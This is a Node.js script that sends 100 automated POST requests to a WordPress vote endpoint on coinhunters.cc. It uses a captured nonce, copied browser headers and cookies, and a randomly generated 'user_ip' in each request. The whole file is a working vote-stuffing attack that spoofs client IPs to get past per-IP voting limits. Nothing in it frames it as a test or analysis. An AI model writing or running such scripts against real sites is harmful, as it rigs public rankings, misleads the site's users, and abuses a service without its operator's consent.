const axios = require('axios');

const createRandomIp = () => {
    const random = () => Math.floor(Math.random() * 255);
    return `191.160.${random()}.${random()}`;
};



const data = {
    action: 'vote_ajax',
    vote_stat: true,
    vote_id: 2221,
    vote_type: false,
    nonce: '1766db7cf6',
    user_ip: createRandomIp(),
};
var config = {
    method: 'post',
    url: 'https://coinhunters.cc/wp-admin/admin-ajax.php',
    headers: {
        accept: 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'pt-PT,pt-BR;q=0.9,pt;q=0.8,en-GB;q=0.7,en;q=0.6,en-US;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        pragma: 'no-cache',
        'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'x-requested-with': 'XMLHttpRequest',
        cookie: '_ga=GA1.2.599495706.1622993984; _gid=GA1.2.385448201.1622993984',
    },
    data: '',
};

(async () => {
    let errorCount = 0;
    let success = 0;

    for (let index = 0; index < 100; index++) {
        try {
            data.user_ip = createRandomIp();

            config.data = new URLSearchParams(data).toString();
            await axios(config)
                .then(function (ss) {
                    success++;

                    console.log('OK', 'Number Vote', ss.data);
                })
                .catch(function (error) {
                    errorCount++;
                    console.log('ERROR', errorCount, error);
                });
        } catch (error) {
            continue;
        }
    }

    console.log('success', success);
    console.log('error', errorCount);
})();